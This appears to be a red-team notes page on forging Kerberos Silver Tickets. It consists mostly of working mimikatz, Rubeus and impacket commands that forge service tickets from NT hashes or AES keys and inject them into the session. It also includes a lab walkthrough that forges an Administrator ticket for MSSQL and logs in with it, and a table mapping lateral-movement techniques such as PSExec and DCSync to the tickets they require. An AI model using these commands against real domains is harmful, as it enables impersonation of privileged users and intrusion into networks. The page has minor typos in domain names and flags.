---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/steal-or-forge-kerberos-tickets/silver-ticket
---

# Silver Ticket

{% code overflow="wrap" %}
```powershell
# mimikatz
kerberos::golden /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /rc4:NThash /user:$impersonate_user /target:SRV01.vulnableone.local /service:CIFS /ptt

kerberos::golden /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /aes128:AES128_key /user:$impersonate_user /service:CIFS /target:SRV01.vulnableone.local /ptt

kerberos::golden /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /aes256:AES256_key /user:$impersonate_user /target:CIFS /target:SRV01.vulnableone.local /service:CIFS /ptt

# Rubeus
Rubeus.exe silver /service:cifs/SRV01.vulnableone.local /aes256:AES256_Key /user:$impersonate_user /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /ptt /nowrap
```
{% endcode %}

### Silver Ticket with svc\_mssql

A silver ticket unlike a golden ticket only gives access to a specific service or machine, where as a golden ticket provides access to any service or machine.&#x20;

Having the service account password from the svc\_mssql account I can forge a ticket with its own password, skip the DC and present the ticket directly to the service. In this case I will forge a ticket for MSSQL with the svc\_mssql password for administrator user but it can be any user we want.

#### Scenario Fits Silver Ticket:

* You have **svc\_mssql** credentials (service account)
* It has a **SPN set** (e.g., `MSSQLSvc/host:1433`)
* This means you can forge a **TGS directly** for that MSSQL service
* No need to contact the DC — the TGS is validated by the **service's own secret**, not the DC

{% code overflow="wrap" %}
```bash
ticketer.py -spn MSSQLSvc/192.168.178.30 -domain-sid S-1-5-21-34554987-3150069868-1232258133 -nthash 42a8c5e6c19b0449515f6004a6316716 -dc-ip 192.168.178.30 -domain grandstay.local -user-id 500 Administrator

# or 

impacket-ticketer -nthash 42A8C5E6C19B0449515F6004A6316716 \
-domain-sid S-1-5-21-34554987-3150069868-1232258133 \
-domain grandstay.local \
-spn MSSQLSvc/MSSQL.grandstay.local \
Administrator

# Usage
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass grandstay.local/Administrator@MSSQL.grandstay.local

```
{% endcode %}

<table data-view="cards"><thead><tr><th>Technique</th><th>Required Service Tickets</th></tr></thead><tbody><tr><td>PSExec</td><td>CIFS</td></tr><tr><td>winrm</td><td>HOST &#x26; HTTP</td></tr><tr><td>dcsync (DCs only)</td><td>LDAP</td></tr><tr><td>Schtasks</td><td>HOST</td></tr><tr><td>WMI interactions</td><td>HOST &#x26; RPCSS</td></tr></tbody></table>
